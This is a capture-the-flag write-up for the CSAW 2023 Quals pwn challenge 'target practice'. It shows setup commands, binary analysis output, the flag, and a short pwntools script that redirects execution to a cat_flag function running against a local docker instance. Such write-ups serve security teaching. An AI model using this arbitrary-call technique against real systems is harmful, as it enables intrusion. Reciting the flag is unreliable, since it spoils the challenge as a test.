# target practice

- source code: [CSAW-CTF-2023-Quals/pwn/target practice at main · osirislab/CSAW-CTF-2023-Quals](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/pwn/target%20practice)

## Setup

```bash
docker build -t csaw23/target_practice .
docker run --rm -p 31138:31138 csaw23/target_practice
```

## Flag

csawctf{y0ure_a_m4s7er4im3r}

## Solution

```console
root@kali:~/ctf/CSAW-CTF-2023-Quals/pwn/target practice# file target_practice
target_practice: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c2ae3c4733d9761d5043faa90d68371e52d74bc2, not stripped

root@kali:~/ctf/CSAW-CTF-2023-Quals/pwn/target practice# checksec target_practice
[*] '/root/ctf/CSAW-CTF-2023-Quals/pwn/target practice/target_practice'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- Input value is assigned as `%lx`
- Using the call instruction to call the function at the address specified as the input value.
- `cat_flag` is the function which executes `system("cat /flag.txt");`

So, the solution is to specify `cat_flag` address as hex format (e.g. 0xdeadbeef).

solver-target_practice.py

```python
from pwn import *

elf = ELF("./target_practice")

if args.REMOTE:
    io = remote("localhost", 31138)
else:
    io = elf.process()

cat_flag = elf.symbols["cat_flag"]

payload = b""
payload += hex(cat_flag).encode()

io.sendline(payload)
io.interactive("")
```

```console
root@kali:~/ctf/CSAW-CTF-2023-Quals/pwn/target practice# python3 solver-target_practice.py REMOTE
[*] '/root/ctf/CSAW-CTF-2023-Quals/pwn/target practice/target_practice'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to localhost on port 31138: Done
[*] Switching to interactive mode
Aim carefully.... csawctf{y0ure_a_m4s7er4im3r}[*] Got EOF while reading in interactive

[*] Closed connection to localhost port 31138
```
